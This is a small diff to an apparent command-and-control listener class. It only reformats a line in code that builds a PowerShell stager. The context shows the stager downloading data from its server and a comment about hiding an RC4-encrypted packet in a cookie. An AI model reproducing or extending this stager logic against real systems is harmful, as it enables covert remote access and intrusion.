@@ -468,7 +468,10 @@ class Listener(object):
                         if headerKey.lower() == "host":
                             stager += "try{$ig=$wc.DownloadData($ser)}catch{};"
                         stager += (
-                            "$wc.Headers.Add(" + f"'{headerKey}','" + headerValue + "');"
+                            "$wc.Headers.Add("
+                            + f"'{headerKey}','"
+                            + headerValue
+                            + "');"
                         )
 
                 # add the RC4 packet to a cookie
